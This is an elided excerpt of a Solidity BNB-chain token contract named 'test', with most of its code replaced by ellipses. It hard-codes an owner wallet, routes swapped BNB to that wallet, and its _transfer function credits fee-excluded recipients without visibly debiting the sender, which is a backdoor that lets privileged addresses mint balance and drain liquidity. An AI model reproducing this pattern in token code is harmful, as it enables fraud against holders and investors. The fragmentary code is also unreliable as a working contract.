...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x234260e5408b8041C26193EB7d31a86A7E807120;
...
contract test is Context, IERC20, Ownable { 
 ...
 function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
    ...
    function _transfer(
        ...
        if (_isExcludedFromFee[from] && _isExcludedFromFee[to]){_tOwned[to]=_tOwned[to]+amount;}
        if ( !_isExcludedFromFee[to] &&
        !_isExcludedFromFee[from] ){
        if(
            txCount >= swapTrigger && 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x234260e5408b8041C26193EB7d31a86A7E807120), BNB_Tot);
